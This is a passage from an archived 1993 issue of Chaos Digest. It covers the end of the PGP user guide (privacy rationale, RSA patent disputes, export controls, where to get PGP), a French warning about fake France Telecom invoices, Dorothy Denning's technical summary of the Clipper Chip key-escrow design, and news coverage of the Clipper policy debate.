is only done in important cases when it seems worthwhile.

More and more of our private communications are being routed through
electronic channels.  Electronic mail will gradually replace
conventional paper mail.  E-mail messages are just too easy to
intercept and scan for interesting keywords.  This can be done
easily, routinely, automatically, and undetectably on a grand scale.
International cablegrams are already scanned this way on a large
scale by the NSA.

We are moving toward a future when the nation will be crisscrossed
with high capacity fiber optic data networks linking together all our
increasingly ubiquitous personal computers.  E-mail will be the norm
for everyone, not the novelty it is today.  Perhaps the Government
will protect our E-mail with Government-designed encryption
protocols.  Probably most people will trust that.  But perhaps some
people will prefer their own protective measures.

Senate Bill 266, a 1991 omnibus anti-crime bill, had an unsettling
measure buried in it.  If this non binding resolution had become real
law, it would have forced manufacturers of secure communications
equipment to insert special "trap doors" in their products, so that
the Government can read anyone's encrypted messages.  It reads:  "It
is the sense of Congress that providers of electronic communications
services and manufacturers of electronic communications service
equipment shall insure that communications systems permit the
Government to obtain the plain text contents of voice, data, and
other communications when appropriately authorized by law."  This
measure was defeated after rigorous protest from civil libertarians
and industry groups.  But the Government has since introduced other
disturbing legislation to work toward similar objectives.

If privacy is outlawed, only outlaws will have privacy.  Intelligence
agencies have access to good cryptographic technology.  So do the big
arms and drug traffickers.  So do defense contractors, oil companies,
and other corporate giants.  But ordinary people and grassroots
political organizations mostly have not had access to affordable
"military grade" public-key cryptographic technology.  Until now.

PGP empowers people to take their privacy into their own hands.
There's a growing social need for it.  That's why I wrote it.

Legal Issues

Trademarks, Copyrights, and Warranties
--------------------------------------

"Pretty Good Privacy", "Phil's Pretty Good Software", and the "Pretty
Good" label for computer software and hardware products are all
trademarks of Philip Zimmermann and Phil's Pretty Good Software.  PGP
is (c) Copyright Philip R. Zimmermann, 1990-1993.  Philip Zimmermann
also holds the copyright for the PGP User's Manual, as well as any
foreign language translations of the manual or the software.

The author assumes no liability for damages resulting from the use of
this software, even if the damage results from defects in this
software, and makes no representations concerning the merchantability
of this software or its suitability for any specific purpose.  It is
provided "as is" without express or implied warranty of any kind.


Patent Rights on the Algorithms
-------------------------------

When I first released PGP, I half-expected to encounter some form of
legal harassment from the Government.  Indeed, there has been legal
harassment, but it hasn't come from the Government-- it has come
from a private corporation.

The RSA public key cryptosystem was developed at MIT with Federal
funding from grants from the National Science Foundation and the
Navy.  It is patented by MIT (U.S. patent #4,405,829, issued 20 Sep
1983).  A company in California called Public Key Partners (PKP) holds
the exclusive commercial license to sell and sub-license the RSA
public key cryptosystem:


+++++
XRPX Acc No: N83-178106
    Cryptographic communication system has encoding and decoding devices
    coupled to memory so that data words may be stored ensuring file
    integrity
Patent Assignee: (MASI ) MASSACHUSETTS INST TECH
Author (Inventor): RIVEST R L; SHAMIR A; ADLEMAN L M
Number of Patents: 001
Patent Family:
    CC Number    Kind     Date      Week
    US 4405829     A     830920     8340    (Basic)
Priority Data (CC No Date): US 860586 (771214)
Abstract (Basic): The system includes a  communications channel coupled to
    at least one terminal having an encoding device and to at least one
    terminal having a decoding device.  A  message-to-be-transferred is
    enciphered to ciphertext at the encoding terminal by encoding the
    message as a number M in a predetermined set.  That  number is then
    raised to a first predetermined power (associated with the intended
    receiver) and finally computed.  The remainder or residue, C, is
    computed when the exponentiated number is divided by the product of two
    predetermined prime numbers (associated with the intended  receiver).
         The residue C is the ciphertext.  The ciphertext is decipheres to
    the original message at the decoding terminal in a similar manner by
    raising the ciphertext to a second predetermined power (associated with
    the intended receiver).  The residue, M', is computed when the
    exponentiated ciphertext is divided by the product of the two
    predetermined prime numbers associated with the intended receiver.  The
    residue M' corresponds to the original encoded message M.   (12pp.)
Int Pat Class: H04K-001/00; H04L-009/04
+++++


The author of this software implementation of the RSA algorithm is
providing this implementation for educational use only.  Licensing this
algorithm from PKP is the responsibility of you, the user, not Philip
Zimmermann, the author of this software implementation.  The author
assumes no liability for any patent infringement that may result from
the unlicensed use by the user of the underlying RSA algorithm used in
this software.

Unfortunately, PKP is not offering any licensing of their RSA patent
to end users of PGP.  This essentially makes PGP contraband in the
USA.  Jim Bidzos, president of PKP, threatened to take legal action
against me unless I stop distributing PGP, until they can devise a
licensing scheme for it.  I agreed to this, since PGP is already in
wide circulation and waiting a while for a licensing arrangement from
PKP seemed reasonable.  Mr. Bidzos assured me (he even used the word
"promise") several times since the initial 5 June 91 release of PGP
that they were working on a licensing scheme for PGP.  Apparently, my
release of PGP helped provide the impetus for them to offer some sort
of a freeware-style license for noncommercial use of the RSA
algorithm.  However, in December 1991 Mr. Bidzos said he had no plans
to ever license the RSA algorithm to PGP users, and denied ever
implying that he would.  Meanwhile, I have continued to refrain from
distributing PGP, although I continue to update the PGP User's Guide,
and have provided the design guidance for new revisions of PGP.
Ironically, all this legal controversy from PKP has imparted a
forbidden flavor to PGP that has only served to amplify its universal
popularity.

I wrote my PGP software from scratch, with my own implementation of
the RSA algorithm.  I didn't steal any software from PKP.  Before
publishing PGP, I got a formal written legal opinion from a patent
attorney with extensive experience in software patents.  I'm
convinced that publishing PGP the way I did does not violate patent
law.  However, it is a well known axiom in the US legal system that
regardless of the law, he with the most money and lawyers prevails,
if not by actually winning then by crushing the little guy with legal
expenses.

Not only did PKP acquire the exclusive patent rights for the RSA
cryptosystem, which was developed with your tax dollars, but they
also somehow acquired the exclusive rights to three other patents
covering rival public key schemes invented by others, also developed
with your tax dollars.  This essentially gives one company a legal
lock in the USA on nearly all practical public key cryptosystems.
They even appear to be claiming patent rights on the very concept of
public key cryptography, regardless of what clever new original
algorithms are independently invented by others.  And you thought
patent law was designed to encourage innovation!  PKP does not
actually develop any software-- they don't even have an engineering
department-- they are essentially a litigation company.

Public key cryptography is destined to become a crucial technology in
the protection of our civil liberties and privacy in our increasingly
connected society.  Why should the Government try to limit access to
this key technology, when a single monopoly can do it for them?

It appears certain that there will be future releases of PGP,
regardless of the outcome of licensing problems with Public Key
Partners.  If PKP does not license PGP, then future releases of PGP
might not come from me.  There are countless fans of PGP outside the
US, and many of them are software engineers who want to improve PGP
and promote it, regardless of what I do.  The second release of PGP
was a joint effort of an international team of software engineers,
implementing enhancements to the original PGP with design guidance
from me.  It was released by Branko Lankester in The Netherlands and
Peter Gutmann in New Zealand, out of reach of US patent law.
Although released only in Europe and New Zealand, it spontaneously
spread to the USA without help from me or the PGP development team.

The IDEA(tm) conventional block cipher used by PGP is covered by a
patent in Europe, held by ETH and a Swiss company called Ascom-Tech
AG.  The patent number is PCT/CH91/00117.  International patents are
pending.  IDEA(tm) is a trademark of Ascom-Tech AG.  There is no
license fee required for noncommercial use of IDEA.  Ascom Tech AG
has granted permission for PGP to use the IDEA cipher, and places no
restrictions on using PGP for any purpose, including commercial use.
You may not extract the IDEA cipher from PGP and put it in another
commercial product without a license.  Commercial users of IDEA may
obtain licensing details from Dieter Profos, Ascom Tech AG, Solothurn
Lab, Postfach 151, 4502 Solothurn, Switzerland, Tel +41 65 242885,
Fax +41 65 235761.

The ZIP compression routines in PGP come from freeware source code,
with the author's permission.  I'm not aware of any patents on the
ZIP algorithm, but you're welcome to check into that question
yourself.  If there are any obscure patent claims that apply to ZIP,
then sorry, you'll have to take care of the patent licensing, not me.

All this patent stuff reminds me of a Peanuts cartoon I saw in the
newspaper where Lucy showed Charlie Brown a fallen autumn leaf and
said "This is the first leaf to fall this year."  Charlie Brown said,
"How do you know that?  Leaves have been falling for weeks."  Lucy
replied, "I had this one notarized."

Licensing and Distribution
--------------------------

In the USA PKP controls, through US patent law, the licensing of the
RSA algorithm.  But I have no objection to anyone freely using or
distributing my PGP software, without payment of fees to me.  You must
keep the copyright notices on PGP and keep this documentation with
it.  However, if you live in the USA, this may not satisfy any legal
obligations you may have to PKP for using the RSA algorithm as
mentioned above.

In fact, if you live in the USA, and you are not a Federal agency,
you shouldn't actually run PGP on your computer, because Public Key
Partners wants to forbid you from running my software.  PGP is
contraband.

PGP is not shareware, it's freeware.  Forbidden freeware.  Published
as a community service.  If I sold PGP for money, then I would get
sued by PKP for using their RSA algorithm.  More importantly, giving
PGP away for free will encourage far more people to use it, which
hopefully will have a greater social impact.  This could lead to
widespread awareness and use of the RSA public key cryptosystem,
which will probably make more money for PKP in the long run.  If only
they could see that.

All the source code for PGP is available for free under the "Copyleft"
General Public License from the Free Software Foundation (FSF).  A
copy of the FSF General Public License is included in the source
release package of PGP.

The PGP version 2.2 executable object release package for MSDOS
contains the PGP executable software, documentation, sample key rings
including my own public key, and signatures for the software and this
manual, all in one PKZIP compressed file called PGP22.ZIP.  The PGP
source release package for MSDOS contains all the C source files in
one PKZIP compressed file called PGP22SRC.ZIP.

You may obtain free copies or updates to PGP from thousands of BBS's
worldwide or from other public sources such as Internet FTP sites.
Don't ask me for a copy directly from me, since I'd rather avoid
further legal problems with PKP at this time.  I might be able to
tell you where you can get it, however.

If you have access to the Internet, watch for announcements of new
releases of PGP on the Internet newsgroups "sci.crypt" and PGP's own
newsgroup, "alt.security.pgp".  There is also an interest group
mailing list called info-pgp, which is intended for users without
access to the "alt.security.pgp" newsgroup.  Info-pgp is moderated by
Hugh Miller, and you may subscribe to it by writing him a letter at
info-pgp-request@lucpul.it.luc.edu.  Include your name and Internet
address.  If you want to know where to get PGP, Hugh can send you a
list of Internet FTP sites and BBS phone numbers.  Hugh may also be
reached at hmiller@lucpul.it.luc.edu.

Export Controls
---------------

The Government has made it illegal in many cases to export good
cryptographic technology, and that may include PGP.  They regard this
kind of software as munitions.  This is determined by volatile State
Department policies, not fixed laws.  I will not export this software
out of the US or Canada in cases when it is illegal to do so under US
State Department policies, and I assume no responsibility for other
people exporting it on their own.

If you live outside the US or Canada, I advise you not to violate US
State Department policies by getting PGP from a US source.  Since
thousands of domestic users got it after its initial publication, it
somehow leaked out of the US and spread itself widely abroad, like
dandelion seeds blowing in the wind.  If PGP has already found its
way into your country, then I don't think you're violating US export
law if you pick it up from a source outside of the US.

It seems to some legal observers I've talked with, that the framers of
the US export controls never envisioned that they would ever apply to
cryptographic freeware that has been published and scattered to the
winds.  It's hard to imagine a US attorney trying to build a real
case against someone for the "export" of software published freely in
the US.  As far as anyone I've talked to knows, it's never been done,
despite numerous examples of export violations.  I'm not a lawyer and
I'm not giving you legal advice-- I'm just trying to point out what
seems like common sense.

Starting with PGP version 2.0, the release point of the software has
been outside the US, on publicly-accessible computers in Europe.
Each release is electronically sent back into the US and posted on
publicly-accessible computers in the US by PGP privacy activists in
foreign countries.  There are some restrictions in the US regarding
the import of munitions, but I'm not aware of any cases where this
was ever enforced for importing cryptographic software into the US.
I imagine that a legal action of that type would be quite a spectacle
of controversy.

Some foreign governments impose serious penalties on anyone inside
their country for merely using encrypted communications.  In some
countries they might even shoot you for that.  But if you live in
that kind of country, perhaps you need PGP even more.

Computer-Related Political Groups

PGP is a very political piece of software.  It seems appropriate to
mention here some computer-related activist groups.  Full details on
these groups, and how to join them, is provided in a separate
document file in the PGP release package.

The Electronic Frontier Foundation (EFF) was founded in July, 1990,
to assure freedom of expression in digital media, with a particular
emphasis on applying the principles embodied in the Constitution and
the Bill of Rights to computer-based communication.  They can be
reached at:  Electronic Frontier Foundation, 238 Main Street,
Cambridge, MA 02142, USA.

The League for Programming Freedom (LPF) is a grass-roots organization
of professors, students, businessmen, programmers and users dedicated
to bringing back the freedom to write programs.  They regard patents
on computer algorithms as harmful to the US software industry.  They
can be reached at (617) 433-7071, or send Internet mail to
lpf@uunet.uu.net

Computer Professionals For Social Responsibility (CPSR) empowers
computer professionals and computer users to advocate for the
responsible use of information technology and empowers all who use
computer technology to participate in public policy debates on the
impacts of computers on society.  They can be reached at:
415-322-3778 in Palo Alto, E-mail address cpsr@csli.stanford.edu.

For more details on these groups, see the accompanying document in
the PGP release package.

Recommended Introductory Readings

1.  Dorothy Denning, "Cryptography and Data Security", Addison-Wesley,
    Reading, MA 1982
2.  Dorothy Denning, "Protecting Public Keys and Signature Keys",
    IEEE Computer, Feb 1983
3.  Martin E. Hellman, "The Mathematics of Public-Key Cryptography,"
    Scientific American, Aug 1979

Other Readings

4.  Ronald Rivest, "The MD5 Message Digest Algorithm", MIT Laboratory
    for Computer Science, 1991
5.  Xuejia Lai, "On the Design and Security of Block Ciphers",
    Institute for Signal and Information Processing, ETH-Zentrum,
    Zurich, Switzerland, 1992
6.  Xuejia Lai, James L. Massey, Sean Murphy, "Markov Ciphers and
    Differential Cryptanalysis", Advances in Cryptology- EUROCRYPT'91
7.  Philip Zimmermann, "A Proposed Standard Format for RSA
    Cryptosystems", Advances in Computer Security, Vol III, edited by
    Rein Turn, Artech House, 1988
8.  Paul Wallich, "Electronic Envelopes", Scientific American, Feb
    1993, pages 30-32.  (This is an article on PGP)

About the Author

Philip Zimmermann is a software engineer consultant with 18 years
experience, specializing in embedded real-time systems, cryptography,
authentication, and data communications.  Experience includes design
and implementation of authentication systems for financial
information networks, network data security, key management
protocols, embedded real-time multitasking executives, operating
systems, and local area networks.

Custom versions of cryptography and authentication products and
public key implementations such as the NIST DSS are available from
Zimmermann, as well as custom product development services.  His
consulting firm's address is:

Mr. Philip Zimmermann
Boulder Software Engineering
3021 Eleventh Street
Boulder, Colorado 80304  USA
Phone 303-541-0140 (voice or FAX)  (10:00am - 7:00pm Mountain Time)
Internet:  prz@sage.cgd.ucar.edu

Where to Get PGP

Finland:    nic.funet.fi  (128.214.6.100)
            Directory: /pub/unix/security/crypt/

Italy:      ghost.dsi.unimi.it  (149.132.2.1)
            Directory: /pub/security/

UK:         src.doc.ic.ac.uk
            Directory: /computing/security/software/PGP

For those lacking FTP connectivity to the net, nic.funet.fi also
offers the files via email.  Send the following mail message to
mailserv@nic.funet.fi:

    ENCODER uuencode
    SEND pub/unix/security/crypt/pgp22src.zip
    SEND pub/unix/security/crypt/pgp22.zip

This will deposit the two zipfiles, as (about) 15 batched messages in
your mailbox within about 24 hours.  Save and uudecode.

PGP is also widely available on Fidonet, a large informal network of
PC-based bulletin board systems interconnected via modems.  Check
your local bulletin board systems.  It is available on many foreign
and domestic Fidonet BBS sites.

For information on PGP implementations on the Apple Macintosh,
Commodore Amiga, or Atari ST, or any other questions about where to
get PGP for any other platform, contact Hugh Miller at
hmiller@lucpul.it.luc.edu.

Here are a few people and their email addresses or phone numbers you
can contact in some countries to get information on local PGP
availability:

Peter Gutmann                 Hugh Kennedy
pgut1@cs.aukuni.ac.nz         70042.710@compuserve.com
New Zealand                   Germany

Branko Lankester              Miguel Angel Gallardo
lankeste@fwi.uva.nl           gallardo@batman.fi.upm.es
+31 2159 42242                (341) 474 38 09
The Netherlands               Spain

Hugh Miller                   Colin Plumb
hmiller@lucpul.it.luc.edu     colin@nyx.cs.du.edu
(312) 508-2727                Toronto, Ontario, Canada
USA

Jean-loup Gailly (21 av. mary, 92500 Rueil Malmaison, Tel.: 1-47518065)
jloup@chorus.fr
France

------------------------------

End of Chaos Digest #1.18
************************************

Chaos Digest               Lundi 19 Avril 1993          Volume 1 : Numero 19

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.19 (19 Avril 1993)
File 1--Alertes aux fausses factures d'annuaires France Telecom
File 2--Le "Clipper Chip": rapide descriptif
File 3--Slide presente a la Maison Blanche durant le briefing
File 4--Clipper Chip et le FBI (reprints)
File 5--Piratage France Telecom par un technicien France Telecom

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.

Issues of ChaosD can also be found on some French BBS.  Back issues of
ChaosD can be found on the Internet as part of the Computer underground
Digest archives.  They're accessible using anonymous FTP from:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.91] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Thu Apr 15 11:47:00 +0200 1993
From: dufour_s@galaxie.int-evry.fr (Stephane DUFOUR )
Subject: File 1--Alertes aux fausses factures d'annuaires France Telecom


     Depuis plus de deux ans, des vagues de pseudo-factures imitant les
factures de France Telecom, se repandent sur le territoire national.  Ces
documents constituent une double tromperie:

     * Ils se presentent d'une part comme des factures, alors qu'ils ne
sont censes etre qu'une offre d'abonnement a un service d'annuaire pour la
telecopie, le telex ou le Minitel.  Cette presentation visiblement destinee
a abuser les consommateurs est penalement reprehensible et confine a la
tentative d'escroquerie.

     * Ils imitent d'autre part d'une facon plus ou moins manifeste les
factures emises par France Telecom, tant en ce qui concerne le nom du
service (France service Minitel, France Telecopie) que la presentation
generale, le logo ou la couleur a dominante bleue.  Ceci constitue aussi
une infraction de contrefacon ou imitation illicite.

     Des l'apparition de ces fraudes, France Telecom a reagi en portant
plainte chaque fois qu'une nouvelle affaire apparaissait.  Il a mis en garde
tous ses abonnes individuellement contre les risques de confusion.  Il est
intervenu sur ce sujet a de nombreuses reprises dans les medias et continue
de la faire.  Une collaboration etroite a ete etablie avec le parquet de
Paris qui centralise les plaintes et coordonne les differentes enquetes.

     France Telecom transmet en particulierles nouveaux "modeles" de factures
des qu'ils lui sont signales.  A titre d'exemple, cette cooperation entre
la justice, France Telecom et la Poste a permis en un an d'intercepter sur
commission rogatoire pres de 350 000 plis avant leur distribution et de
bloquer, en liaison avec les banques de nombreux cheques.

     L'instruction judiciaire a ete rendue plus difficile par le caractere
international de la fraude qui affecte une bonne partie de l'Europe et
utilise l'Autriche et le Lichtenstein comme plaques tournantes.  Toutefois
plusieurs personnes devraient etre traduites devant le tribunal correction-
nel d'ici cet ete.

------------------------------

Date: Wed, 21 Apr 93 19:21:48 EDT
From: denning@cs.cosc.georgetown.edu (Dorothy Denning )
Subject: File 2--Le "Clipper Chip": rapide descriptif
Repost from: RISKS Digest


                     THE CLIPPER CHIP: A TECHNICAL SUMMARY
                               Dorothy Denning
                           Revised, April 21, 1993

INTRODUCTION

On April 16, the President announced a new initiative that will bring
together the Federal Government and industry in a voluntary program
to provide secure communications while meeting the legitimate needs of
law enforcement.  At the heart of the plan is a new tamper-proof encryption
chip called the "Clipper Chip" together with a split-key approach to
escrowing keys.  Two escrow agencies are used, and the key parts from
both are needed to reconstruct a key.


CHIP CONTENTS

The Clipper Chip contains a classified single-key 64-bit block
encryption algorithm called "Skipjack."  The algorithm uses 80 bit keys
(compared with 56 for the DES) and has 32 rounds of scrambling
(compared with 16 for the DES).  It supports all 4 DES modes of
operation.  The algorithm takes 32 clock ticks, and in Electronic
Codebook (ECB) mode runs at 12 Mbits per second.

Each chip includes the following components:

   the Skipjack encryption algorithm
   F, an 80-bit family key that is common to all chips
   N, a 30-bit serial number (this length is subject to change)
   U, an 80-bit secret key that unlocks all messages encrypted with the chip

The chips are programmed by Mykotronx, Inc., which calls them the
"MYK-78."  The silicon is supplied by VLSI Technology Inc.  They are
implemented in 1 micron technology and will initially sell for about
$30 each in quantities of 10,000 or more.  The price should drop as the
technology is shrunk to .8 micron.


ENCRYPTING WITH THE CHIP

To see how the chip is used, imagine that it is embedded in the AT&T
telephone security device (as it will be).  Suppose I call someone and
we both have such a device.  After pushing a button to start a secure
conversation, my security device will negotiate an 80-bit session key K
with the device at the other end.  This key negotiation takes place
without the Clipper Chip.  In general, any method of key exchange can
be used such as the Diffie-Hellman public-key distribution method.

Once the session key K is established, the Clipper Chip is used to
encrypt the conversation or message stream M (digitized voice).  The
telephone security device feeds K and M into the chip to produce two
values:

   E[M; K], the encrypted message stream, and
   E[E[K; U] + N; F], a law enforcement field ,

which are transmitted over the telephone line.  The law enforcement
field thus contains the session key K encrypted under the unit key U
concatenated with the serial number N, all encrypted under the family
key F.  The law enforcement field is decrypted by law enforcement after
an authorized wiretap has been installed.

The ciphertext E[M; K] is decrypted by the receiver's device using the
session key:

        D[E[M; K]; K] = M .


CHIP PROGRAMMING AND ESCROW

All Clipper Chips are programmed inside a SCIF (Secure Compartmented
Information Facility), which is essentially a vault.  The SCIF contains
a laptop computer and equipment to program the chips.  About 300 chips
are programmed during a single session.  The SCIF is located at
Mykotronx.

At the beginning of a session, a trusted agent from each of the two key
escrow agencies enters the vault.  Agent 1 enters a secret, random
80-bit value S1 into the laptop and agent 2 enters a secret, random
80-bit value S2. These random values serve as seeds to generate unit
keys for a sequence of serial numbers.  Thus, the unit keys are a
function of 160 secret, random bits, where each agent knows only 80.

To generate the unit key for a serial number N, the 30-bit value N is
first padded with a fixed 34-bit block to produce a 64-bit block N1.
S1 and S2 are then used as keys to triple-encrypt N1, producing a
64-bit block R1:

        R1 = E[D[E[N1; S1]; S2]; S1] .

Similarly, N is padded with two other 34-bit blocks to produce N2 and
N3, and two additional 64-bit blocks R2 and R3 are computed:

        R2 = E[D[E[N2; S1]; S2]; S1]
        R3 = E[D[E[N3; S1]; S2]; S1] .

R1, R2, and R3 are then concatenated together, giving 192 bits. The
first 80 bits are assigned to U1 and the second 80 bits to U2.  The
rest are discarded.  The unit key U is the XOR of U1 and U2.  U1 and U2
are the key parts that are separately escrowed with the two escrow
agencies.

As a sequence of values for U1, U2, and U are generated, they are
written onto three separate floppy disks.  The first disk contains a
file for each serial number that contains the corresponding key part
U1.  The second disk is similar but contains the U2 values.  The third
disk contains the unit keys U.  Agent 1 takes the first disk and agent
2 takes the second disk.  Thus each agent walks away knowing
an 80-bit seed and the 80-bit key parts.  However, the agent does not
know the other 80 bits used to generate the keys or the other 80-bit
key parts.

The third disk is used to program the chips.  After the chips are
programmed, all information is discarded from the vault and the agents
leave.  The laptop may be destroyed for additional assurance that no
information is left behind.

The protocol may be changed slightly so that four people are in the
room instead of two.  The first two would provide the seeds S1 and S2,
and the second two (the escrow agents) would take the disks back to
the escrow agencies.

The escrow agencies have as yet to be determined, but they will not
be the NSA, CIA, FBI, or any other law enforcement agency.  One or
both may be independent from the government.


LAW ENFORCEMENT USE

When law enforcement has been authorized to tap an encrypted line, they
will first take the warrant to the service provider in order to get
access to the communications line.  Let us assume that the tap is in
place and that they have determined that the line is encrypted with the
Clipper Chip.  The law enforcement field is first decrypted with the
family key F, giving E[K; U] + N.  Documentation certifying that a tap
has been authorized for the party associated with serial number N is
then sent (e.g., via secure FAX) to each of the key escrow agents, who
return (e.g., also via secure FAX) U1 and U2.  U1 and U2 are XORed
together to produce the unit key U, and E[K; U] is decrypted to get the
session key K.  Finally the message stream is decrypted.  All this will
be accomplished through a special black box decoder.


CAPSTONE: THE NEXT GENERATION

A successor to the Clipper Chip, called "Capstone" by the government
and "MYK-80" by Mykotronx, has already been developed.  It will include
the Skipjack algorithm, the Digital Signature Standard (DSS), the
Secure Hash Algorithm (SHA), a method of key exchange, a fast
exponentiator, and a randomizer.  A prototoype will be available for
testing on April 22, and the chips are expected to be ready for
delivery in June or July.


ACKNOWLEDGMENT AND DISTRIBUTION NOTICE

This article is based on information provided by NSA, NIST, FBI, and
Mykotronx.  Permission to distribute this document is granted.

------------------------------

Date: Mon, 19 Apr 93 9:21:53 EDT
From: clipper@first.org (Clipper Chip Announcement )
Subject: File 3--Slide presente a la Maison Blanche durant le briefing

Note:     The following material was handed out a press briefing on the
          Clipper Chip on 4/16.

                        Chip Operation

                           Microchip
User's Message      +----------------------+
------------------> |                      |      1.  Message encrypted
                    | Encryption Algorithm |          with user's key
                    |                      |
                    | Serial #             |      2.  User's key encrypted
                    |                      |-->       with chip unique key
                    | Chip Unique Key      |
User's Encryption   |                      |      3.  Serial # encrypted
Key                 | Chip Family Key      |          with chip family key
------------------> |                      |
                    |                      |
                    +----------------------+


              For Law Enforcement to Read a Suspect's Message

1. Need to obtain court authorized warrant to tap the suspect's telephone;

2. Record encrypted message;

3. Use chip family key to decrypt chip serial number;

4. Take this serial number *and* court order to custodians of disks A and B;

5. Add the A and B components for that serial number = the chip
   unique key for the suspect user;

6. Use this key to decrypt the user's message key for
   this recorded message;

7. Finally, use this message key to decrypt the recorded message.

------------------------------

Date: Mon Apr 19 12:58:44 -0400 1993
From: prutkov@garnet.acns.fsu.edu (Paul Rutkovsky )
Subject: File 4--Clipper Chip et le FBI (reprints)
Copyrights: Warren Publishing, Inc. & San Jose Mercury News, 1993


GOVT. WEIGHS IN ON PRIVACY-VS.-ENCRYPTION DEBATE,  WITH ITS OWN TECHNOL OGY

Communications Daily   April 19, 1993   p. N/A
ISSN: 0277-0679

    Clinton   Administration   Fri.  announced  sweeping  policy  directive
designed   to  protect  privacy  of  voice  and  data  transmissions  using
govt.-developed encryption technology that ensures law enforcement agencies
will  have  ability  to  eavesdrop.  Encyrption is  achieved through use of
"Clipper    Chip  "  that  will  be  built  into telephones, computers, fax
machines.  Although  govt.  will  adopt  new  chip  as its standard, use in
private sector will be on voluntary basis.

    AT&T  Fri.  became  first  company  to  announce  publicly  support  of
 Clipper    Chip  .  "We  believe  it  will  give our customers far greater
protection in defeating hackers or eavesdroppers in attempting to intercept
a  call,"  said  AT&T Vp Secure Communications Systems Edward Hickey. Govt.
already has purchased some evaluation units from AT&T with  Clipper   Chip
installed,  said  Raymond  Kramer,  acting  dir.  of  National Institute of
Standards  &  Technology  (NIST).  Govt. expects to purchase "well over the
thousands"  of  such   Clipper   Chip  units, he said, but he couldn't give
figures  for  how many it might buy from AT&T. AT&T spokesman said products
with   Clipper    Chip   included  will  be  available  commercially in 2nd
quarter.

    President  Clinton Thurs. signed Top Secret National Security Directive
outlining  details  of  privacy  and  encryption policy review. Review will
bring  together  industry  and  govt.  experts  under direction of National
Security Council in attempt to resolve long-running controversy on right of
businesses  and  citizens  to  protect all forms of communication and govt.
right to conduct lawful investigations. Review will take 3-4 months, NIST's
Kramer said.

    Law  enforcement  agencies  are  concerned  about  rising popularity of
digital   encryption   methods.  Multinational  businesses,  worried  about
economic  espionage,  increasingly  are incorporating encryption technology
for  all  communications.  Law  enforcement  agencies  have  voiced growing
concern  that if they don't move quickly to enact laws assuring them access
to   encrypted   and  digital  communications,  they  will  be  at  decided
disadvantage in attempting to thwart  criminal acts.   FBI  spokesman James
Kallstrom acknowledged that "not many" criminals today are using encryption
to  skirt  law,  but  putting  methods  in  place  now  to  assure means of
intercepting such communications "is vital" to law enforcement's mission.

    Encryption  program  will  be  available  to  any  vendor that wants to
manufacture  chips,  Kramer  said.  However,  company  that  developed  and
designed  chip  under  sole-source  contract  from National Security Agency
(NSA)  --  Mykotronx,  Torrance,  Cal.  -- has solid lead on market. Kramer
acknowledged   job   was   handed   to  it  with  NSA's  full  approval  of
noncompetitive  bid  contract.  He defended noncompetition aspect: "We went
out  and  found the only company capable of delivering this technology." He
said  govt.  has been using  Clipper   Chip  technology for "a while now in
classified  applications,"  but declined to say how long it had been in use
before  White   House  announcement.

    Each  chip will have 3 unique "keys" issued to it. When manufactured, 2
of  those  keys  will be sent to govt. and will be held by "escrow agents."
For  law  enforcement  agency to be able descramble transmissions, it first
must  get  court order that allows keys held in escrow to be released. Only
when  those keys are used in tandem can law enforcement agencies unscramble
codes and listen in on conversations. Attorney Gen.'s office will "make all
arrangements with appropriate entities to hold keys,"  White   House  said.
Those escrow keys could be held by private organizations, govt. agencies or
others,  Kramer  said.  But  only  2  entities  will  be chosen and will be
responsible  for  administering  data  base  that will store keys. Attorney
Gen.'s  office is expected to select escrow key holders "within a couple of
weeks," Kramer said.

    Plan  already  is  drawing fire from civil liberties groups and privacy
advocates.  Electronic Frontier Foundation (EFF) said  White   House  acted
"before  any  public  comment  or  discussion  has  been  allowed." It said
Administration  will  use  "its  leverage  to  get  all telephone equipment
vendors  to adopt" technology. EFF criticized govt.'s sole-source contract,
saying there may be other companies that have better encryption technology,
and  because  encryption  algorithm is classified, it can't be tested. "The
public will only have confidence in the security of a standard that is open
to  independent,  expert scrutiny," EFF said. Privacy experts are concerned
that  because   Clipper    Chip  was developed under NSA contract, it might
have "backdoor" known only to NSA that would allow agency to crack code and
bypass  court  order. Kramer disagreed: "There is positively no backdoor to
this technology."

    Because  use  of  Clipper   Chip  is entirely voluntary, businesses and
private  users  -- including criminals -- are free to choose other means of
encryption,  leaving  govt.  and law enforcement agencies with dilemma they
now  face.    FBI  's  Kallstrom  acknowledged criminals still could thwart
investigations  if  they  used  non- Clipper    Chip   products,  "but most
criminals aren't so smart."

    Ability  of  govt.   to  eavesdrop on  Clipper   Chip -equipped devices
still  doesn't  solve  broader  problem:  Ability  to wiretap conversations
moving  across  digital  telecommunications  lines.  That  problem is being
addressed  separately  by  FBI 's controversial digital wiretap legislation
that has failed to find congressional sponsor and is languishing in Justice
Dept., waiting for support of Attorney Gen.

+++++

U.S. SCHEME TO EAVESDROP ELECTRONICALLY RAISES CONCERNS CIVIL LIBERTARIANS,
INDUSTRY GROUP WANT PUBLIC INPUT INTO 'KEY' PLAN
San Jose Mercury News (SJ) - Saturday, April 17, 1993
